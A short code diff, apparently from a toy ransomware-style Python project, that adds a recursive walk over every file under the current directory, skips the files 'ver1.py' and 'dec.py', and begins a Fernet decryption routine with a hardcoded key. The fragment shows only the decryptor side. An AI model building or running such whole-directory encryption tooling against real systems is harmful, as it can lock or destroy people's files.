@@ -5,6 +5,25 @@ from cryptography.fernet import Fernet
 key = bytes(b'Devang')
 
 
+files = []
+
+
+def files_in_directory(path):
+    try:
+        with os.scandir(path) as entries:
+            for entry in entries:
+                if entry.is_file():
+                    files.append(entry)
+                elif entry.is_dir():
+                    files_in_directory(entry.path)
+    except PermissionError:
+        pass
+files_in_directory(os.getcwd())
+
+for file in files:
+    if os.path.basename(file) == "ver1.py" or os.path.basename(file) == "dec.py":
+        files.remove(file)
+
 def dec():
     for file in files:
         with open(file,"rb") as thefile:
